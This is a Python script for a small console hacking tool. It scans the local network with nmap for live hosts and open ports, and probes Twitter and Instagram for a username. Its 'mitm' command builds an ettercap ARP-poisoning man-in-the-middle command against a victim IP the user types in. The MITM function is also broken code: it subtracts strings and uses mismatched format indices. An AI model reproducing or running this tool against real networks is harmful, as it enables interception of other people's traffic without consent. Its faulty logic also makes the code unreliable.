import nmap
import os
import socket as sc
from sys import platform
import sys
from bs4 import BeautifulSoup as bs
import requests as rq
import netifaces as ni


if platform == "linux" or platform == "linux2":
    os.system("clear")
if platform == "win32":
    os.system("cls")

def colored(r, g, b, text):
    return "\033[38;2;{};{};{}m{} \033[38;2;255;255;255m".format(r, g, b, text)

def help():
    print("\n")
    print("     ", colored(0, 255, 0, commands[0]), "makes you exit.")
    print("     ",colored(0, 255, 0, commands[3]), "clear the screen")
    print("     ",colored(0, 255, 0, commands[2]), "prompt the help menu")
    print("\n")
    print("     ",colored(0, 255, 0, commands[1]), "show the alive devices on your local network")
    print("     ",colored(0, 255, 0, commands[4]), "check open ports on the alive devices of your local network")
    print("     ",colored(0, 255, 0, commands[7]), "chack for all alive connexion on your local network")
    print("     ",colored(0, 255, 0, commands[5]), "attack a device with 'man in the middle' attack")
    print("     ",colored(0, 255, 0, commands[6]), "looks for a username in various websites")



def scan():
    nm = nmap.PortScanner()
    myip = local_ip+"/24"
    scan = nm.scan(hosts= myip , arguments='-sn')
    for i in scan['scan']:
        brand = list(scan['scan'][i]['vendor'].values())
        name = scan['scan'][i]['hostnames'][0]['name']
        if len(brand) > 0:
            print(colored(0, 255, 0, i), "made by", colored(0, 255, 150, brand[0]), "and called", colored(0, 255, 150, name), "is up")
        else:
            print(colored(0, 255, 0, i), "made by", colored(0, 255, 150, "Unknown"), "and called", colored(0, 255, 150, name), "is up")

def scan_all():
    nm = nmap.PortScanner()
    myip = local_ip+"/24"
    scan_all = nm.scan(hosts= myip , arguments='-sn -Pn')
    for i in scan_all['scan']:
        brand = list(scan_all['scan'][i]['vendor'].values())
        name = scan_all['scan'][i]['hostnames'][0]['name']
        if len(brand) == 1 and name != str():
            print(colored(0, 255, 0, i), "made by", colored(0, 255, 150, brand[0]), "and called", colored(0, 255, 150, name), "is up")
        elif len(brand) == 0 and name != str():
            print(colored(0, 255, 0, i), "made by", colored(0, 255, 150, "Unknown"), "and called", colored(0, 255, 150, name), "is up")


def scan_firewall():
    nm = nmap.PortScanner()
    myip = local_ip+"/24"
    scan = nm.scan(hosts= myip , arguments='-sn -Pn')
    for i in scan['scan']:
        if scan['scan'][i]['hostnames'][0]['name'] != str():
            print("     ", colored(255, 0, 0, i))
            print("")
            S = nm.scan(i, '20-450')
            try:
                for p in S['scan'][i]['tcp']:
                    print("     port", colored(0, 255, 0, str(p)), "is open")
            except KeyError:
                print(colored(255, 0, 0, "  None. "))
            print("")

def mitm():
    w = ""
    e = ""
    if platform == "linux" or platform == "linux2":
        for i in (local_ip, -1):
            if i != ".":
                w = w + str(i)
            else:
                for c in (w, -i):
                    e = e + str(c)
        root = local_ip - e
        v = str(input("what device do you want to attacks ?"))
        victime = root + v
        os.system("ettercap -T -S -M arp:remote /{1}// /{2}//".format(root + "1", victime))
    if platform == "win32":
        print("")
        print("you must be on linux and have ettercap installed")

def search():
    user = str(input("username :"))
    for i in url:
        code = rq.get(i + user).text
        soup = bs(code, 'lxml')
        title = soup.find_all('title')
        print(title)



def main():
    run = True
    while run:
        verif = False
        cmd = str(input(colored(255, 0, 0, "        -$  ")))

        for i in commands:
            if cmd == i:
                verif = True
        if verif == True:
            if cmd == "exit":
                if platform == "linux" or platform == "linux2":
                    os.system("clear")
                if platform == "win32":
                    os.system("cls")
                print(colored(0, 255, 0, "Goodbye."))
                run = False
            if cmd == "clear":
                if platform == "linux" or platform == "linux2":
                    os.system("clear")
                if platform == "win32":
                    os.system("cls")
            if cmd == "help":
                help()

            if cmd == "scan":
                scan()
            if  cmd == "scan firewall":
                scan_firewall()
            if cmd == "scan all":
                scan_all()
            if cmd == "mitm":
                mitm()
            if cmd == "search":
                search()
        else:
            print("\n")
            print(colored(255, 0, 0, "      '{}'".format(cmd)), colored(50, 50, 150, " is not a command, use help to see all the commands."))
        print("\n")

print("\n")
print("@%(,.                   .,#                                        ")
print("                *@@@@@@@@@*@                                       ")
print("        @@@,                @*             &                       ")
print(" @@                          @@@@@@@@@@@,      *                   ")
print("                          (@@@&         .@@@@@*@   %               ")
print("                        (@@#                   @@@@@ ,             ")
print("                       %@@                          @@@@           ")
print("                       @@                            #@@@          ")
print("                        @@@                                        ")
print("                         @@@@.                                     ")
print("                            *@@@@@@@@@@@@@@@@#                     ")
print("                                             &@@@@@@@@@            ")
print("                                                   @@    %@@       ")
print("                                                      #@     .@    ")
print("                                                         @      @  ")
print("                                                           %      .")
print("                                                            @      ")
print("                                                             #     ")

print("\n")

print(colored(255, 0, 0, "      Hello"), colored(0, 255, 0, "{}".format(sc.gethostname())), colored(255, 0, 0, "I am nobody."))
print("\n")

#local_ip = sc.gethostbyname(sc.gethostname())
#print(local_ip)

try:
    ni.ifaddresses('eth0')
    local_ip = str(ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'])
except ValueError:
    try:
        ni.ifaddresses('wlan0')
        local_ip = str(ni.ifaddresses('wlan0')[ni.AF_INET][0]['addr'])
    except ValueError:
        try:
            ni.ifaddresses('wlan1')
            local_ip = str(ni.ifaddresses('wlan1')[ni.AF_INET][0]['addr'])
        except ValueError:
            local_ip = sc.gethostbyname(sc.gethostname())

url = ["https://www.twitter.com/", "https://www.instagram.com/"]

commands = ["exit", "scan", "help", "clear", "scan firewall", "mitm", "search", "scan all"]

main()
